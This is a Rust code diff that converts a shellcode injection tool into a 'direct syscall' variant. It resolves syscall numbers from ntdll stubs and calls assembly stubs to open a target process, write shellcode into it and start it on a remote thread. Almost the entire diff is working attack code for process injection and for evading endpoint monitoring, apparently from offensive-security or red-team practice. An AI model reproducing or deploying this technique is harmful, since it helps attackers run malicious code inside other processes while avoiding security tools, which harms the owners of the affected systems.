@@ -30,7 +30,17 @@ pub struct OBJECT_ATTRIBUTES {
     SecurityQualityOfService: *mut c_void,
 }
 #[unsafe(no_mangle)]
-pub static mut MN_NTAVM: u8 = 0x0;
+pub static mut MN_NTAVM: u32 = 0x0;
+#[unsafe(no_mangle)]
+pub static mut MN_NTOP: u32 = 0x0;
+#[unsafe(no_mangle)]
+pub static mut MN_NTCTEX: u32 = 0x0;
+#[unsafe(no_mangle)]
+pub static mut MN_NTWVM: u32 = 0x0;
+#[unsafe(no_mangle)]
+pub static mut MN_NTWFSO: u32 = 0x0;
+#[unsafe(no_mangle)]
+pub static mut MN_NTC: u32 = 0x0;
 
 type HANDLE = *mut c_void;
 const MEM_COMMIT: u32 = 0x1000;
@@ -50,18 +60,23 @@ unsafe extern "C" {
         AllocationType: u32,
         Protect: u32,
     ) -> NTSTATUS;
-}
 
-#[link(name = "ntdll")]
-unsafe extern "system" {
-    pub fn NtOpenProcess(
+    fn asm_NtWriteVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut c_void,
+        Buffer: *mut c_void,
+        BufferSize: usize,
+        ReturnSize: *mut usize,
+    ) -> NTSTATUS;
+
+    fn asm_NtOpenProcess(
         ProcessHandle: *mut HANDLE,
         DesiredAccess: u32,
         ObjectAttributes: *mut OBJECT_ATTRIBUTES,
         ClientId: *mut CLIENT_ID,
     ) -> NTSTATUS;
 
-    pub fn NtCreateThreadEx(
+    fn asm_NtCreateThreadEx(
         thread_handle: *mut HANDLE,
         desired_access: u32,
         object_attributes: *mut c_void,
@@ -75,17 +90,9 @@ unsafe extern "system" {
         attribute_list: *mut c_void,
     ) -> NTSTATUS;
 
-    pub fn NtWriteVirtualMemory(
-        ProcessHandle: HANDLE,
-        BaseAddress: *mut c_void,
-        Buffer: *mut c_void,
-        BufferSize: usize,
-        ReturnSize: *mut usize,
-    ) -> NTSTATUS;
+    fn asm_NtWaitForSingleObject(Handle: HANDLE, Altertable: u8, Timeout: *mut i64) -> NTSTATUS;
 
-    pub fn NtWaitForSingleObject(Handle: HANDLE, Altertable: u8, Timeout: *mut i64) -> NTSTATUS;
-
-    pub fn NtClose(Handle: HANDLE) -> NTSTATUS;
+    fn asm_NtClose(Handle: HANDLE) -> NTSTATUS;
 }
 
 pub fn main() -> windows::core::Result<()> {
@@ -95,7 +102,7 @@ pub fn main() -> windows::core::Result<()> {
         let pid_str = match args.next() {
             Some(pid_str) => pid_str,
             None => {
-                println!("Usage : nt-basic <pid>");
+                println!("Usage : direct_syscall <pid>");
                 std::process::exit(1);
             }
         };
@@ -125,7 +132,14 @@ pub fn main() -> windows::core::Result<()> {
             | PROCESS_QUERY_INFORMATION;
         let ntdll_name = PCSTR(b"ntdll.dll\0".as_ptr());
         let ntdll_handle = GetModuleHandleA(ntdll_name)?;
-        let openprocess_status = NtOpenProcess(
+        let name_nt_open_process =
+            CString::new("NtOpenProcess").expect("CString convertion failed for NtOpenProcess");
+        let ntdll_nt_open_process =
+            GetProcAddress(ntdll_handle, PCSTR(name_nt_open_process.as_ptr() as _))
+                .expect("GetProcAddress failed for NtOpenProcess");
+        let addr_nt_open_process = ntdll_nt_open_process as *const u8;
+        MN_NTOP = *addr_nt_open_process.add(4) as u32;
+        let openprocess_status = asm_NtOpenProcess(
             &mut h_process as *mut HANDLE,
             desired_access,
             &mut object_attributes as *mut OBJECT_ATTRIBUTES,
@@ -170,7 +184,7 @@ pub fn main() -> windows::core::Result<()> {
         )
         .expect("GetProcAddress failed for NtAllocateVirtualMemory");
         let addr_nt_allocate_virtual_memory = ntdll_nt_allocate_virtual_memory as *const u8;
-        MN_NTAVM = *addr_nt_allocate_virtual_memory.add(4);
+        MN_NTAVM = *addr_nt_allocate_virtual_memory.add(4) as u32;
 
         let mut region_size: usize = shellcode.len() as usize;
         let mut remote_addr: *mut c_void = std::ptr::null_mut();
@@ -188,8 +202,17 @@ pub fn main() -> windows::core::Result<()> {
             "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
             allocation_status.0
         );
+        let name_nt_write_virtual_memory = CString::new("NtWriteVirtualMemory")
+            .expect("CString convertion failed for NtWriteVirtualMemory");
+        let ntdll_nt_write_virtual_memory = GetProcAddress(
+            ntdll_handle,
+            PCSTR(name_nt_write_virtual_memory.as_ptr() as _),
+        )
+        .expect("GetProcAddress failed for NtWriteVirtualMemory");
+        let addr_nt_write_virtual_memory = ntdll_nt_write_virtual_memory as *const u8;
+        MN_NTWVM = *addr_nt_write_virtual_memory.add(4) as u32;
         let write_size: *mut usize = std::ptr::null_mut();
-        let write_status = NtWriteVirtualMemory(
+        let write_status = asm_NtWriteVirtualMemory(
             h_process,
             remote_addr,
             shellcode.as_ptr() as *mut c_void,
@@ -198,12 +221,20 @@ pub fn main() -> windows::core::Result<()> {
         );
         assert!(
             write_status.0 == 0,
-            "NtWrtieVirtualMemomry failed with NTSTATUS: 0x{:X}",
+            "NtWriteVirtualMemomry failed with NTSTATUS: 0x{:X}",
             write_status.0
         );
 
+        let name_nt_create_thread_ex = CString::new("NtCreateThreadEx")
+            .expect("CString convertion failed for NtCreateThreadEx");
+        let ntdll_nt_create_thread_ex =
+            GetProcAddress(ntdll_handle, PCSTR(name_nt_create_thread_ex.as_ptr() as _))
+                .expect("GetProcAddress failed for NtCreateThreadEx");
+        let addr_nt_create_thread_ex = ntdll_nt_create_thread_ex as *const u8;
+        MN_NTCTEX = *addr_nt_create_thread_ex.add(4) as u32;
+
         let mut h_thread: HANDLE = std::ptr::null_mut();
-        let status = NtCreateThreadEx(
+        let status = asm_NtCreateThreadEx(
             &mut h_thread,
             0x1FFFFF,
             ptr::null_mut(),
@@ -222,15 +253,29 @@ pub fn main() -> windows::core::Result<()> {
             "NtCreateThreadEx failed with NTSTATUS: 0x{:X}",
             status.0
         );
+        let name_nt_wait_for_single_object = CString::new("NtWaitForSingleObject")
+            .expect("CString convertion failed for NtWaitForSingleObject");
+        let ntdll_nt_wait_for_single_object = GetProcAddress(
+            ntdll_handle,
+            PCSTR(name_nt_wait_for_single_object.as_ptr() as _),
+        )
+        .expect("GetProcAddress failed for NtWaitForSingleObject");
+        let addr_nt_wait_for_single_object = ntdll_nt_wait_for_single_object as *const u8;
+        MN_NTWFSO = *addr_nt_wait_for_single_object.add(4) as u32;
 
-        let wfso_status = NtWaitForSingleObject(h_thread, 0, ptr::null_mut());
+        let wfso_status = asm_NtWaitForSingleObject(h_thread, 0, ptr::null_mut());
         assert!(
             wfso_status.0 == 0,
             "NtWaitForSingleObject failed with NTSTATUS: 0x{:X}",
             wfso_status.0
         );
-        let _ = NtClose(h_thread);
-        let _ = NtClose(h_process);
+        let name_nt_close = CString::new("NtClose").expect("CString convertion failed for NtClose");
+        let ntdll_nt_close = GetProcAddress(ntdll_handle, PCSTR(name_nt_close.as_ptr() as _))
+            .expect("GetProcAddress failed for NtClose");
+        let addr_nt_close = ntdll_nt_close as *const u8;
+        MN_NTC = *addr_nt_close.add(4) as u32;
+        let _ = asm_NtClose(h_thread);
+        let _ = asm_NtClose(h_process);
         return Ok(());
     }
 }
